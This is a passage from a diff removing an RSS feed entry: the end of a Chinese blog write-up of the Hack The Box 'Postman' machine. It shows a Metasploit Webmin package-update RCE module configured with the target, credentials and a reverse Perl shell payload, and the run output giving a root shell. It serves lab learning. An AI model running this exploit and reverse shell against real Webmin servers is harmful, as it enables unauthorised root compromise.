-   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
-   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
-
-
-msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/linux/http/webmin_packageup_rce
-
-msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options 
-
-Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/linux/http/webmin_packageup_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-
-   Name       Current Setting  Required  Description
-   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
-   PASSWORD   computer2008     &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Webmin Password
-   Proxies                     no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
-   RHOSTS     10.10.10.160     &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&quot;s1&quot;&gt;'file:&amp;lt;path&amp;gt;'&lt;/span&gt;
-   RPORT      10000            &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-   SSL        &lt;span class=&quot;nb&quot;&gt;true             &lt;/span&gt;no        Negotiate SSL/TLS &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;outgoing connections
-   TARGETURI  /                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Base path &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Webmin application
-   USERNAME   Matt             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Webmin Username
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cmd/unix/reverse_perl&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-
-   Name   Current Setting  Required  Description
-   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
-   LHOST  10.10.15.44      &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-   LPORT  4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port
-
-
-Exploit target:
-
-   Id  Name
-   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-   0   Webmin &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1.910
-
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;设置好选项，注意 SSL 选项需要设置为 true&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.165:9004 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Session cookie: 8269def18359f1629182b2d26b9f86ed
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to execute the payload...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 2 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.14.165:9004 -&amp;gt; 10.10.10.160:41404&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-11-28 05:12:27 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;root.txt
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x05-thanks&quot;&gt;0x05 Thanks！&lt;/h2&gt;
-
-&lt;p&gt;也算是自己边学边记录，望大佬手下留情~&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 03 Jan 2020 08:28:00 +0800</pubDate>
-        <link>http://localhost:4000/2020/01/03/HTB-Postman/</link>
-        <guid isPermaLink="true">http://localhost:4000/2020/01/03/HTB-Postman/</guid>
         
         <category>HTB</category>
         
